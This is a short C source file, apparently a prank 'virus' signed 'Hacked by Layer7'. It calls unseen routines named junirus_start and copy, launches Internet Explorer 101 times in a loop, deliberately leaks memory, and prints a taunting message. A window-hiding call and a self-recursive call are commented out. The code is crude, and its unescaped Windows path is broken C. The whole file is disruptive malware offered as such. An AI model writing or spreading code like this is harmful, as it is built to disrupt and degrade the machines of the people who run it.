#include "junirus.h"
#include "_copy.h"

void Virus_Proliferation();
int main() {
	junirus_start(L"D:\\juno");
	copy();
	Virus_Proliferation();
	int i;
	for(i=0; i<=100; i++) {
		WinExec("C:\Program Files\Internet Explorer\IEXPLORE.exe",SW_SHOW);
	}

	return 0;
}

void Virus_Proliferation(){
	HWND hWnd = GetConsoleWindow();
	//ShowWindow(hWnd, SW_HIDE);

	char Virus_Name[]="Hacked by Layer7";
	char tmp[] = "L7L7L7L7L7L7L7L7L7";
	char *a;
	int i;
	for(i=0; i<=100; i++) {
		a = (char*)malloc(1000);
	}
	//Virus_Proliferation();
	printf("happy day~~!\n");
}